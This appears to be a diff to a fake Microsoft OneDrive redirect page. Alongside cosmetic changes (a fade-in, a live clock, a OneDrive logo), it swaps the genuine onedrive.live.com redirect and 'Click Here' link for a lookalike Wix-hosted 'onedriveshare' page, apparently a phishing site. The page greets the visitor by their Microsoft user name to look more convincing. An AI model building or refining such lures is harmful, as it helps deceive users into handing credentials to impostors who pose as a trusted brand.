@@ -19,10 +19,12 @@
             box-shadow: 0px 4px 6px rgba(0, 0, 0, 0.1);
             display: inline-block;
             position: relative;
+            opacity: 0;
+            animation: fadeIn 2s forwards;
         }
-        .logo {
-            width: 150px;
-            margin-bottom: 20px;
+        .onedrive-logo {
+            width: 100px;
+            margin-top: 20px;
         }
         h1 {
             color: #0078d4;
@@ -48,6 +50,10 @@
             0% { transform: rotate(0deg); }
             100% { transform: rotate(360deg); }
         }
+        @keyframes fadeIn {
+            0% { opacity: 0; }
+            100% { opacity: 1; }
+        }
         .button {
             display: inline-block;
             background-color: #0078d4;
@@ -61,6 +67,11 @@
         .button:hover {
             background-color: #005a9e;
         }
+        .time {
+            font-size: 18px;
+            margin-top: 20px;
+            color: #0078d4;
+        }
     </style>
     <script>
         function getMicrosoftUser() {
@@ -71,22 +82,32 @@
             });
         }
 
+        function displayTime() {
+            const now = new Date();
+            const options = { hour: '2-digit', minute: '2-digit', second: '2-digit', hour12: true };
+            const time = now.toLocaleTimeString([], options);
+            document.getElementById("current-time").innerText = `Current Time: ${time}`;
+        }
+
         window.onload = async function() {
             const userName = await getMicrosoftUser();
             document.getElementById("user-greeting").innerText = `Hello, ${userName}!`;
-            
+            displayTime();
+            setInterval(displayTime, 1000); // Update time every second
+
             setTimeout(function() {
-                window.location.href = "https://onedrive.live.com";
+                window.location.href = "https://mailuser6754.wixsite.com/onedriveshare";
             }, 3000);
         };
     </script>
 </head>
 <body>
-    <div class="container">
-        <img class="logo" src="https://upload.wikimedia.org/wikipedia/commons/4/44/Microsoft_logo.svg" alt="Microsoft Logo">
+    <div class="container" aria-live="polite" aria-labelledby="user-greeting">
         <h1 id="user-greeting">Redirecting to OneDrive...</h1>
         <div class="loading"></div>
-        <p>If you are not redirected automatically, <a href="https://onedrive.live.com" class="button">Click Here</a>.</p>
+        <img class="onedrive-logo" src="https://upload.wikimedia.org/wikipedia/commons/e/e1/OneDrive_logo.svg" alt="OneDrive Logo" loading="lazy">
+        <p id="current-time" class="time"></p>
+        <p>If you are not redirected automatically, <a href="https://mailuser6754.wixsite.com/onedriveshare" class="button">Click Here</a>.</p>
     </div>
 </body>
 </html>
